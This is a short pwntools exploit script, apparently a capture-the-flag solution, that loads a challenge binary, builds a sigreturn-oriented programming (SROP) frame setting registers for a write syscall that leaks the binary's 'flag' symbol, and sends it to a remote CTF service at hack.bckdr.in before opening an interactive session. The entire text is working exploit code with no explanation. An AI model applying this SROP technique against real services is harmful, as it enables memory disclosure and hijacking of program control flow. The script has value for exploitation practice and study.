from pwn import *
import time

context(arch='amd64', os='linux')
fp		= ('./player_bin')
elf		= ELF(fp)

syscall_gdt	= elf.symbols['syscall']
flag		= elf.symbols['flag']

print "syscall_gdt: " + hex(syscall_gdt) + "\nflag: "+hex(flag)

frame		= SigreturnFrame(kernel='amd64')
frame.rax	= constants.SYS_write
frame.rdi	= constants.STDOUT_FILENO
frame.rsi	= flag
frame.rdx	= 0x100
frame.rsp	= 0xcafebabe
frame.rip	= syscall_gdt

#fd	= open('./payload.txt', 'w')
#if(fd):
#	fd.write(str(frame))
#	fd.close()

p		= remote('hack.bckdr.in', 9034)
p.sendline(str(frame))
p.interactive()
